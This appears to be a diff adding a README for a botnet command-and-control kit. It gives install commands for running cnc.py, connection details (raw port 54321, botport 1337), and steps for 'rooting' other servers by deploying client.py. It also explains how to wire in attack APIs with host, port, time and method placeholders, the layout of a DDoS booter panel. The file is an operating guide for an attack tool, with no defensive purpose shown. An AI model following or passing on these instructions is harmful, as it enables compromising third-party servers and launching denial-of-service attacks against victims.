@@ -1,0 +1,29 @@
+RECOMENDED OS: UBUNTU 16
+===============INSTALLATION==============
+1. Drag the cnc folder into your /root/ directory
+2. Run these commands:
+
+apt-get update
+apt-get -y install python3-pip
+apt-get -y install screen
+pip3 install requests
+screen python3 cnc.py
+
+3. Connect on putty. Default putty port is 54321 with raw connection
+
+===============ROOTING SERVERS===============
+1. Drag and drop client.py into the server you want to root
+2. Make sure screen is installed
+3. python3 client.py [serverip] [botport]
+Default botport is 1337
+
+==============CONFIG===============
+You can change the look of the menus is menus.py
+
+Use {COLOR} to change the color of the following text.
+
+To add apis, open apis.py and add the api link in APILINK1. For the IP substitute {HOST}, port use {PORT}, 
+time use {TIME}, method use {METHOD}
+
+
+Then in APIMETHODS1 add the API method names on the left and the nickname for that method in your cnc on the right.
